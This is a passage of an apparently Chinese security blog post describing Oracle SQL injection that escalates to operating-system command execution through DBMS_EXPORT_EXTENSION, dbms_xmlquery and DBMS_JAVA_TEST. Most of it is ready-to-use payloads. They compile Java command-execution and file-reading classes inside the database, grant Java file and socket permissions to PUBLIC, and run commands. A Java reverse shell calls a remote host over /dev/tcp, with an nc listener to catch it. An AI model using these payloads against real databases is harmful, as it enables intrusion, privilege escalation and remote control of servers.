select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();\}\}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();\}\\}\}'''';END;'';END;--','SYS',0,'1',0) from dual
```

**赋予 Java 权限**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual
```

**创建函数**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual
```

**赋予函数执行权限**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual
```

**执行系统命令**

```
select sys.LinxRunCMD('/bin/bash -c /usr/bin/whoami') from dual
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXlURtakMwD8fyJaJV8vw4ghjRheIVpLibbH6V5NvWEHnatmsPibn7YELA/640?wx_fmt=png)

46a99a5f54c8a8cbadca2549dd53d9fe.png

### dbms_xmlquery.newcontext()

> • 影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)• 必须在 DBMS_PORT_EXTENSION 存在漏洞情况下，否则赋予权限时无法成功 s

**创建 Java 库**

```
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();\}\\}\}'';commit;end;') from dual;
```

**赋予当前用户 Java 权限**

```
--当前用户查看
select user from dual

select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual;
```

通过以下命令可以查看 all_objects 内部改变：

```
select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%'
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXViaX73iaRRib44iaIa0N17T41BExnKXm0RykvNC1KHv2gn4lJ4haPFvCOA/640?wx_fmt=png)

image-20211006110557755

**创建函数**

```
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
```

判断是否创建成功

```
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD'
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXv7kBEErgf63wdSibhxlB7RicuxJWjdPZVXSzUOuqWmtZ3K0NzhsIX1FQ/640?wx_fmt=png)

也可通过查看 all_objects 内部改变判断

```
select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%'
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXicBgWox530SoIGmXwCP5CI4zw2lR6XkbbsxtdYgFPnGU2J8MNFTaEgA/640?wx_fmt=png)

image-20211006110714309

若想删除创建的函数，通过以下命令删除

```
drop function LinxRunCMD
```

**执行命令**

```
select LinxRunCMD('id') from dual
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXcyys8RsZQz2w3cYKoviaFpd4S1Kw2ag1xawGvO8ricSO6ibtvVB1uc4aQ/640?wx_fmt=png)

2849daa3c5c2ade13eb918a3ca0ad502.png

### dbms_java_test.funcall()

> • 影响版本：10g R2, 11g R1, 11g R2• 权限：Java Permissions

```
Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd > /tmp/pwd.txt') from dual;
```

执行时报如下错

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEX80sMVA0l7Iib4p0ficnyBTZcjePyLBWZrQNlFflUwydlFhkIwxiby1YdA/640?wx_fmt=png)

5bf9bd61e8d2fa65abe45e7a3506eb08.png

但不影响命令的执行

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXnnqBasE9sAhNyedsjLA3WuWPOPfdvVlDUW7W7iapFMIubsiacphEvkxA/640?wx_fmt=png)

image-20211006110810998

该方式无回显，在注入时不太方便利用，但可通过此方式反弹。

Java 反弹 Shell
-------------

在提权操作中如果遇到无回显情况，如上部分第三种方法，可以通过反弹 shell 的方式，在自己 VPS 上利用 nc 监听端口。以此来执行交互式执行命令（类似带外通信）。

### 编译 payload

java 源代码（linux 系统的 payload）：

```
import java.io.*;
import java.net.*;
public class shellRev
{
        public static void main(String[] args)
        {
                System.out.println(1);
                try{run();}
                catch(Exception e){}
        }
public static void run() throws Exception
        {
                String[] aaa={"/bin/bash","-c","exec 9<> /dev/tcp/192.168.1.50/8080;exec 0<&9;exec 1>&9 2>&1;/bin/sh"};
                Process p=Runtime.getRuntime().exec(aaa);
    }
}
```

```
#编译
javac shellRev.java
#执行
java shellRev
```

### 使用 Java 执行

**创建 Java 库**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell {public static void run() throws Exception{String[] aaa={"/bin/bash","-c","exec 9<> /dev/tcp/127.0.0.1/8080;exec 0<&9;exec 1>&9 2>&1;/bin/sh"};Process p=Runtime.getRuntime().exec(aaa);\}\}'''';END;'';END;--','SYS',0,'1',0) from dual
```

**赋予 Java 权限**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
```

**创建函数**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
```

**赋予函数执行权限**

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual
```

### 反弹 shell

```
select sys.reversetcp from dual
```

shell 命令行输入：

```
nc -vv -l p 8080
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibM8iahChKskMzib8fJ0y0SEXAnZbL7VmohibOMicSmkz5Gfp449Eapg9XswtVnSSTWoLJDiaZ0oBZiccww/640?wx_fmt=png)

推荐阅读
----

[**实战 | Bypass 云锁 MySQL 注入总结**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247502391&idx=1&sn=44e7c75c6403624fa1715641c1d85ac7&chksm=ec1c9f08db6b161efcb031e0b94e58bf4c6a925e4a98b5fac0dea8b0566f32053fbf73412850&scene=21#wechat_redirect)

[**实战 | BypassD 盾之 SQL 注入绕过总结**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247502429&idx=1&sn=98a4af1f4b81e99c50509735e0da28a3&chksm=ec1c9f62db6b1674787200cef3d3231c768c2cd23f034cc4d1c1d6b29464160af9f4113f100c&scene=21#wechat_redirect)

[**实战 | WAF-Bypass 之 SQL 注入绕过安全狗**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247502468&idx=2&sn=73cc3049f2dcb4930d842a100e78fd4a&chksm=ec1c9fbbdb6b16ad92a8bd7630e61ead64ed2458cacc120e9a32f99309881d5c3f867480248c&scene=21#wechat_redirect)  

Oracle grant revoke 总结

https://blog.csdn.net/wise_man/article/details/5288918

Oracle 权限管理详解

https://www.cnblogs.com/yw0219/p/5855210.html)

看了这个, 谁还怕 Oracle 注入?(有彩蛋)

[https://mp.weixin.qq.com/s/MYkvQDpYZbz67F6qK9Ri0g](https://mp.weixin.qq.com/s?__biz=Mzg5MTA3NTg2MA==&mid=2247484053&idx=1&sn=4b0759e70704eaafbc460ec1c1733d9b&scene=21#wechat_redirect "https://mp.weixin.qq.com/s?__biz=Mzg5MTA3NTg2MA==&mid=2247484053&idx=1&sn=4b0759e70704eaafbc460ec1c1733d9b&scene=21#wechat_redirect")

Oracle 报错注入总结

https://www.cnblogs.com/-qing-/p/10949562.html

Oracle 注入 - 命令执行 & Shell 反弹

https://redn3ck.github.io/2018/04/25/Oracle 注入 - 命令执行 - Shell 反弹 /

Oracle 数据库提权

https://www.cnblogs.com/micr067/p/12763325.html

**点赞，转发，在看**

原创作者：Ulysses

内部学员投稿

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)